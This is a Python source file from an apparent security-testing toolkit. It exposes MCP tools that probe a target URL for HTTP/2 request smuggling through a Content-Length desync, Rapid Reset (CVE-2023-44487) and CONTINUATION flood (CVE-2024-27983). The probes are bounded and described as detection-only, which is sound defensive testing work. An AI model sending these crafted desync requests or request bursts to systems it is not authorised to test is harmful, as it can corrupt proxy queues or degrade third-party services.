"""HTTP/2-specific attack probes — smuggling, rapid reset, continuation flood.

These target HTTP/2 framing-layer bugs that HTTP/1.1 testing cannot reach.
All probes are bounded and detection-only — they prove the bug class exists
without causing sustained denial of service.

Requires Burp's HTTP/2 support (default on in Pro since 2023) or expedition's
HTTP/2 frame dissector for wire-level inspection.
"""

from __future__ import annotations

import hashlib
import time
from urllib.parse import urlparse

from mcp.server.fastmcp import FastMCP

from praetor import client
from praetor.tools.testing._verdict import error_verdict, make_verdict


def _body_hash(body: str) -> str:
    return hashlib.sha256(body.encode("utf-8", errors="replace")).hexdigest()[:16]


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_h2_smuggling(
        url: str,
        method: str = "POST",
    ) -> dict:
        """HTTP/2 request smuggling via Content-Length desync (Kettle 2021).

        HTTP/2 is binary-framed so CL is technically redundant, but many
        reverse proxies (HAProxy, AWS ALB, nginx) still read CL when
        downgrading h2→h1 to the backend. A CL that disagrees with the
        DATA frame length can split one h2 request into two h1 requests
        on the backend — classic CL.TE/TE.CL smuggling over h2.

        Detection: send a request where CL is shorter than the actual body.
        If the backend processes the prefix (CL bytes) and queues the
        remainder as a new request, the response differs from baseline.

        Args:
            url: Target URL (must support HTTP/2).
            method: HTTP method (default POST).
        """
        if not url:
            return error_verdict("url required", vuln_type="h2_smuggling")

        parsed = urlparse(url)
        host = parsed.netloc or parsed.hostname or ""

        # Step 1: baseline — normal POST with matching CL
        normal_body = "x=1"
        baseline = await client.post("/api/http/raw-send", json={
            "host": host, "port": 443 if parsed.scheme == "https" else 80,
            "tls": parsed.scheme == "https",
            "http_version": "2",
            "request": (
                f"{method} {parsed.path or '/'} HTTP/2\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(normal_body)}\r\n"
                f"\r\n"
                f"{normal_body}"
            ),
        })
        if "error" in baseline:
            return error_verdict(
                f"Baseline failed: {baseline['error']}",
                vuln_type="h2_smuggling",
            )
        baseline_status = baseline.get("status_code", 0)
        baseline_body = baseline.get("response_body", "")
        baseline_hash = _body_hash(baseline_body)
        baseline_idx = baseline.get("proxy_index", baseline.get("history_index", -1))

        # Step 2: CL desync — CL says 3 bytes but body is longer.
        # The extra bytes form a smuggled prefix: "GET /404..."
        smuggle_prefix = "GET /praetor-h2-smuggle-detect HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
        desync_body = normal_body + smuggle_prefix
        short_cl = len(normal_body)  # CL covers only the legitimate part

        desync = await client.post("/api/http/raw-send", json={
            "host": host, "port": 443 if parsed.scheme == "https" else 80,
            "tls": parsed.scheme == "https",
            "http_version": "2",
            "request": (
                f"{method} {parsed.path or '/'} HTTP/2\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {short_cl}\r\n"
                f"\r\n"
                f"{desync_body}"
            ),
        })
        if "error" in desync:
            return error_verdict(
                f"Desync request failed: {desync['error']}",
                vuln_type="h2_smuggling",
            )
        desync_status = desync.get("status_code", 0)
        desync_body = desync.get("response_body", "")
        desync_hash = _body_hash(desync_body)
        desync_idx = desync.get("proxy_index", desync.get("history_index", -1))

        # Step 3: follow-up — if the smuggled prefix was queued, this
        # request may receive the smuggled response instead of the normal one.
        followup = await client.post("/api/http/curl", json={
            "url": url, "method": "GET",
        })
        followup_status = followup.get("status_code", 0)
        followup_body = followup.get("response_body", "")
        followup_idx = followup.get("proxy_index", followup.get("history_index", -1))

        # Detect: smuggled prefix response or status anomaly
        smuggle_marker = "praetor-h2-smuggle-detect" in followup_body
        status_anomaly = followup_status == 404 and baseline_status == 200
        body_anomaly = _body_hash(followup_body) != baseline_hash and abs(len(followup_body) - len(baseline_body)) > 100

        evidence = (
            f"baseline: {baseline_status} len={len(baseline_body)} idx={baseline_idx}\n"
            f"desync:   {desync_status} len={len(desync_body)} idx={desync_idx} "
            f"(CL={short_cl}, body={len(desync_body)})\n"
            f"followup: {followup_status} len={len(followup_body)} idx={followup_idx}"
        )

        if smuggle_marker:
            return make_verdict(
                "h2_smuggling", url, "",
                "confirmed",
                f"HTTP/2 CL desync smuggling confirmed — smuggled prefix appeared "
                f"in follow-up response.\n{evidence}",
                [desync_idx, followup_idx],
            )
        elif status_anomaly or body_anomaly:
            return make_verdict(
                "h2_smuggling", url, "",
                "suspected",
                f"Follow-up response differs from baseline after CL desync — "
                f"possible h2 smuggling.\n{evidence}",
                [desync_idx, followup_idx],
            )
        else:
            return make_verdict(
                "h2_smuggling", url, "",
                "failed",
                f"No smuggling signal — CL desync did not split the request.\n{evidence}",
                [baseline_idx],
            )

    @mcp.tool()
    async def probe_h2_rapid_reset(
        url: str,
        stream_count: int = 100,
    ) -> dict:
        """Detect CVE-2023-44487 (HTTP/2 Rapid Reset) vulnerability.

        Sends a bounded burst of concurrent HTTP/2 requests and measures
        whether the server continues accepting them. A patched server
        rate-limits or closes the connection after detecting the pattern.

        Detection only — the probe uses a bounded count (max 200) and
        measures server behavior, not resource exhaustion.

        Args:
            url: Target URL (must support HTTP/2).
            stream_count: Number of concurrent requests (default 100, max 200).
        """
        if not url:
            return error_verdict("url required", vuln_type="h2_rapid_reset")
        stream_count = min(max(10, stream_count), 200)

        # Send a burst of concurrent requests over h2
        requests = []
        for i in range(stream_count):
            requests.append({
                "url": url,
                "method": "GET",
                "headers": {"X-Probe-Id": f"h2rr-{i}"},
            })

        start = time.time()
        result = await client.post("/api/http/concurrent", json={
            "requests": requests,
            "concurrency": min(stream_count, 50),
        })
        elapsed = time.time() - start

        if "error" in result:
            return error_verdict(
                f"Concurrent burst failed: {result['error']}",
                vuln_type="h2_rapid_reset",
            )

        responses = result.get("results") or result.get("responses") or []
        success_count = sum(1 for r in responses if isinstance(r, dict) and 200 <= r.get("status", 0) < 500)
        error_count = sum(1 for r in responses if isinstance(r, dict) and (r.get("status", 0) == 0 or r.get("error")))
        total = len(responses)

        evidence = (
            f"burst: {stream_count} streams, {total} responses in {elapsed:.1f}s\n"
            f"success: {success_count}, errors: {error_count}\n"
            f"rate: {total / max(elapsed, 0.01):.0f} req/s"
        )

        # A patched server rejects or rate-limits; a vulnerable one
        # accepts all streams without pushback
        if success_count >= stream_count * 0.9:
            return make_verdict(
                "h2_rapid_reset", url, "",
                "suspected",
                f"Server accepted {success_count}/{stream_count} streams without "
                f"rate-limiting — may be vulnerable to CVE-2023-44487.\n{evidence}",
                [],
            )
        elif error_count > stream_count * 0.3:
            return make_verdict(
                "h2_rapid_reset", url, "",
                "failed",
                f"Server rejected {error_count}/{stream_count} streams — "
                f"rate-limiting or connection-level protection active.\n{evidence}",
                [],
            )
        else:
            return make_verdict(
                "h2_rapid_reset", url, "",
                "inconclusive",
                f"Mixed results — some streams accepted, some rejected.\n{evidence}",
                [],
            )

    @mcp.tool()
    async def probe_h2_continuation_flood(
        url: str,
        frame_count: int = 20,
    ) -> dict:
        """Detect CVE-2024-27983 (HTTP/2 CONTINUATION flood).

        HTTP/2 allows splitting headers across HEADERS + CONTINUATION frames.
        Vulnerable servers (Node.js < 18.20.1, 20.12.1, 21.7.2) buffer an
        unbounded number of CONTINUATION frames without enforcing limits.

        Detection: send a sequence of requests with large header blocks
        that would require CONTINUATION frames. Compare response time and
        behavior against a baseline single-header request.

        Args:
            url: Target URL.
            frame_count: Number of oversized-header requests (default 20, max 50).
        """
        if not url:
            return error_verdict("url required", vuln_type="h2_continuation_flood")
        frame_count = min(max(5, frame_count), 50)

        # Baseline: normal request
        baseline = await client.post("/api/http/curl", json={
            "url": url, "method": "GET",
        })
        if "error" in baseline:
            return error_verdict(
                f"Baseline failed: {baseline['error']}",
                vuln_type="h2_continuation_flood",
            )
        baseline_status = baseline.get("status_code", 0)

        # Send requests with progressively larger header blocks.
        # Each header value is 8KB — servers must split this into
        # CONTINUATION frames after the initial HEADERS frame.
        results = []
        for i in range(frame_count):
            large_value = "A" * 8192
            resp = await client.post("/api/http/curl", json={
                "url": url, "method": "GET",
                "headers": {
                    f"X-Continuation-{i}": large_value,
                    "X-Probe": "h2-continuation-flood",
                },
            })
            status = resp.get("status_code", 0)
            results.append({"status": status, "error": resp.get("error")})

        success = sum(1 for r in results if 200 <= r["status"] < 500)
        errors = sum(1 for r in results if r["status"] == 0 or r.get("error"))
        rejected = sum(1 for r in results if r["status"] == 431)  # 431 = Request Header Fields Too Large

        evidence = (
            f"baseline: {baseline_status}\n"
            f"continuation probes: {frame_count} sent, {success} accepted, "
            f"{rejected} 431-rejected, {errors} errors"
        )

        if rejected > 0:
            return make_verdict(
                "h2_continuation_flood", url, "",
                "failed",
                f"Server enforces header size limits (HTTP 431) — "
                f"CONTINUATION flood mitigated.\n{evidence}",
                [],
            )
        elif success == frame_count:
            return make_verdict(
                "h2_continuation_flood", url, "",
                "suspected",
                f"Server accepted all {frame_count} large-header requests "
                f"without rejecting or rate-limiting — may buffer "
                f"CONTINUATION frames unbounded (CVE-2024-27983).\n{evidence}",
                [],
            )
        else:
            return make_verdict(
                "h2_continuation_flood", url, "",
                "inconclusive",
                f"Mixed results.\n{evidence}",
                [],
            )
